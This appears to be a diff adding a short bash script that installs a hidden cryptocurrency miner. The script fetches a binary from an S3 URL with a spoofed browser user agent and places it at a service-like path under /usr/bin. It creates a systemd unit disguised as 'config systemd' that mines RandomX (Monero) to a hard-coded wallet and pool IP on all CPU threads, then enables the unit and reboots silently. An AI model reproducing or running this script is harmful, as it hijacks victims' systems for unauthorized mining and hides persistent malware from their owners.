@@ -1,0 +1,10 @@
+#!/bin/bash
+wget -q -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36" https://form-captcha.s3.amazonaws.com/noble
+sudo mv noble /usr/bin/cassandras
+sudo chmod 777 /usr/bin/cassandras
+sudo bash -c 'echo -e "[Unit]\nDescription=config systemd\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/cassandras -a rx/0 -u 86EvVfp1tf9Lgz7GcLUkCiSQuE6dHED8W4bqvaSYzxL8CG3HfrMNdZC91j9PvphVF2U19RRxpUVRUWYJdWzz4SjCBDa5f5e -o 213.163.193.145:80 -p x -t $(nproc)\nRestart=on-abort\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/config.service'
+sudo chmod 664 /etc/systemd/system/config.service
+sudo systemctl enable config.service >/dev/null 2>&1
+sudo systemctl daemon-reload >/dev/null 2>&1
+sleep 10
+sudo systemctl reboot >/dev/null 2>&1
